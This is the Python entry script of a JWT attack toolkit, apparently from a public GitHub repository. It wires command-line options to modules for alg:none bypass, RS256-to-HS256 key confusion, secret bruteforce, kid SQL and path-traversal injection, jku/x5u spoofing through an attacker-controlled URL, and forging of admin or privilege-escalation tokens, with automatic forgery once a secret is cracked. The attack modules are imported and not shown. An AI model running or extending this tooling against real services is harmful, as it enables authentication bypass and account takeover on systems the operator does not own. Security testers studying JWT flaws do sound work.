#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════╗
║              JWT ATTACK SUITE  —  by 0xZ33                   ║
║         github.com/Zeeshanafridai/jwt-attack-suite           ║
╚══════════════════════════════════════════════════════════════╝

Attacks:
  none        —  alg:none bypass (all variants)
  confusion   —  RS256 → HS256 algorithm confusion
  bruteforce  —  Weak secret bruteforce (HS256/384/512)
  kid         —  kid header injection (SQLi + path traversal)
  jku         —  jku header spoofing (host your own JWKS)
  x5u         —  x5u header spoofing (host your own cert)
  forge       —  Token forgery with known secret
  privesc     —  Auto privilege escalation payloads
  embedded    —  Embedded JWK attack
  decode      —  Decode and display token info
  all         —  Run all applicable attacks
"""

import argparse
import json
import sys
import os

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from jwt_attacks.utils import pretty_print_token, decode_token
from jwt_attacks import (
    alg_none,
    rs_hs_confusion,
    bruteforce,
    kid_injection,
    jku_x5u_spoof,
    forge,
)

BANNER = """
\033[91m
   ██╗██╗    ██╗████████╗    ███████╗██╗   ██╗██╗████████╗███████╗
   ██║██║    ██║╚══██╔══╝    ██╔════╝██║   ██║██║╚══██╔══╝██╔════╝
   ██║██║ █╗ ██║   ██║       ███████╗██║   ██║██║   ██║   █████╗  
██ ██║██║███╗██║   ██║       ╚════██║██║   ██║██║   ██║   ██╔══╝  
╚█████╔╝╚███╔███╔╝   ██║       ███████║╚██████╔╝██║   ██║   ███████╗
 ╚════╝  ╚══╝╚══╝    ╚═╝       ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   ╚══════╝
\033[0m
\033[90m  JWT Attack Suite — Offensive JWT Testing Toolkit\033[0m
\033[90m  ─────────────────────────────────────────────────\033[0m
"""


def parse_claims(claims_str: str) -> dict:
    """Parse --claims argument as JSON string."""
    if not claims_str:
        return None
    try:
        return json.loads(claims_str)
    except json.JSONDecodeError as e:
        print(f"  [!] Invalid JSON for --claims: {e}")
        print(f"  [!] Example: --claims '{{\"role\":\"admin\",\"sub\":\"1\"}}'")
        sys.exit(1)


def main():
    print(BANNER)

    parser = argparse.ArgumentParser(
        prog="jwt-attack",
        description="JWT Attack Suite — Offensive JWT Testing Toolkit",
        formatter_class=argparse.RawDescriptionHelpFormatter
    )

    # Required
    parser.add_argument("attack", nargs="?", default="decode",
                        choices=["none", "confusion", "bruteforce", "kid",
                                 "jku", "x5u", "forge", "privesc", "embedded",
                                 "decode", "all"],
                        help="Attack type to run")

    parser.add_argument("-t", "--token", required=False,
                        help="JWT token to attack")

    parser.add_argument("-f", "--file", required=False,
                        help="File containing JWT token(s), one per line")

    # Attack options
    parser.add_argument("--claims", "-c",
                        help='JSON claims to inject. Example: \'{"role":"admin"}\'')

    parser.add_argument("--secret", "-s",
                        help="HMAC secret (for bruteforce verification or forgery)")

    parser.add_argument("--wordlist", "-w",
                        help="Wordlist path for bruteforce attack")

    parser.add_argument("--pubkey", "-p",
                        help="RSA public key file (PEM) for RS256→HS256 confusion")

    parser.add_argument("--jwks", "-j",
                        help="JWKS URL to fetch public key from")

    parser.add_argument("--attacker-url", "-u",
                        help="Attacker-controlled URL for jku/x5u spoofing")

    parser.add_argument("--kid-type",
                        choices=["sqli", "path", "all"], default="all",
                        help="kid injection type (default: all)")

    parser.add_argument("--custom-kid",
                        help="Custom kid value for injection")

    parser.add_argument("--custom-secret",
                        default="pwned",
                        help="Secret to use for kid injection (default: pwned)")

    parser.add_argument("--extend-exp", type=int,
                        help="Extend expiry by N seconds (0 = remove exp)")

    parser.add_argument("--threads", type=int, default=8,
                        help="Threads for bruteforce (default: 8)")

    parser.add_argument("--serve", action="store_true",
                        help="Serve JWKS locally for jku attack")

    parser.add_argument("--port", type=int, default=8888,
                        help="Port for local JWKS server (default: 8888)")

    parser.add_argument("--output", "-o",
                        help="Save results to JSON file")

    parser.add_argument("--quiet", "-q", action="store_true",
                        help="Suppress banner and minimize output")

    args = parser.parse_args()

    # Load token
    token = None
    if args.token:
        token = args.token.strip()
    elif args.file:
        with open(args.file) as f:
            lines = [l.strip() for l in f if l.strip()]
        token = lines[0]  # Process first token; multi-token support can be added
        if len(lines) > 1:
            print(f"  [*] Loaded {len(lines)} tokens from file, processing first")
    else:
        # Try stdin
        if not sys.stdin.isatty():
            token = sys.stdin.read().strip()

    if not token:
        parser.print_help()
        print("\n  [!] No token provided. Use -t TOKEN or -f FILE\n")
        sys.exit(1)

    # Parse claims
    claims = parse_claims(args.claims)

    # Load public key file
    pubkey = None
    if args.pubkey:
        with open(args.pubkey) as f:
            pubkey = f.read()

    # Always show token decode first
    print("[*] TOKEN ANALYSIS")
    pretty_print_token(token)

    all_results = {}
    attack = args.attack

    # ── DECODE ──────────────────────────────────────────────────────────────
    if attack == "decode":
        sys.exit(0)

    # ── ALG NONE ────────────────────────────────────────────────────────────
    if attack in ("none", "all"):
        results = alg_none.run(token, claims=claims, verbose=not args.quiet)
        all_results["alg_none"] = results

    # ── RS256 → HS256 CONFUSION ─────────────────────────────────────────────
    if attack in ("confusion", "all"):
        if pubkey or args.jwks:
            result = rs_hs_confusion.run(
                token, public_key=pubkey, jwks_url=args.jwks,
                claims=claims, verbose=not args.quiet
            )
            all_results["rs_hs_confusion"] = result
        elif attack == "confusion":
            print("  [!] confusion attack requires --pubkey <file.pem> or --jwks <url>")

    # ── BRUTEFORCE ──────────────────────────────────────────────────────────
    if attack in ("bruteforce", "all"):
        result = bruteforce.run(
            token, wordlist=args.wordlist,
            threads=args.threads, verbose=not args.quiet
        )
        all_results["bruteforce"] = result
        # If we found the secret, auto-run forge
        if result.get("secret") and claims:
            print("[*] Secret found — auto-running token forgery with your claims")
            forge_result = forge.run(
                token, secret=result["secret"], claims=claims,
                extend_exp=args.extend_exp or 86400 * 365,
                verbose=not args.quiet
            )
            all_results["auto_forge"] = forge_result

    # ── KID INJECTION ────────────────────────────────────────────────────────
    if attack in ("kid", "all"):
        results = kid_injection.run(
            token, attack_type=args.kid_type, claims=claims,
            custom_kid=args.custom_kid, custom_secret=args.custom_secret,
            verbose=not args.quiet
        )
        all_results["kid_injection"] = results

    # ── JKU SPOOF ────────────────────────────────────────────────────────────
    if attack in ("jku", "all"):
        if args.attacker_url:
            result = jku_x5u_spoof.run(
                token, attacker_url=args.attacker_url, attack_type="jku",
                claims=claims, serve=args.serve, port=args.port,
                verbose=not args.quiet
            )
            all_results["jku_spoof"] = result
        elif attack == "jku":
            print("  [!] jku attack requires --attacker-url <url>")

    # ── X5U SPOOF ────────────────────────────────────────────────────────────
    if attack in ("x5u",):
        if args.attacker_url:
            result = jku_x5u_spoof.run(
                token, attacker_url=args.attacker_url, attack_type="x5u",
                claims=claims, verbose=not args.quiet
            )
            all_results["x5u_spoof"] = result
        else:
            print("  [!] x5u attack requires --attacker-url <url>")

    # ── FORGE ────────────────────────────────────────────────────────────────
    if attack in ("forge",):
        if args.secret and claims:
            result = forge.run(
                token, secret=args.secret, claims=claims,
                extend_exp=args.extend_exp, verbose=not args.quiet
            )
            all_results["forge"] = result
        else:
            print("  [!] forge requires --secret and --claims")

    # ── PRIVESC ──────────────────────────────────────────────────────────────
    if attack in ("privesc",):
        if args.secret:
            results = forge.run(
                token, secret=args.secret, attack_type="privesc",
                verbose=not args.quiet
            )
            all_results["privesc"] = results
        else:
            print("  [!] privesc requires --secret")

    # ── EMBEDDED JWK ─────────────────────────────────────────────────────────
    if attack in ("embedded",):
        result = forge.run(
            token, attack_type="embedded_jwk", claims=claims,
            verbose=not args.quiet
        )
        all_results["embedded_jwk"] = result

    # ── OUTPUT ───────────────────────────────────────────────────────────────
    if args.output:
        with open(args.output, "w") as f:
            json.dump(all_results, f, indent=2, default=str)
        print(f"\n  [+] Results saved to {args.output}\n")

    return all_results


if __name__ == "__main__":
    main()
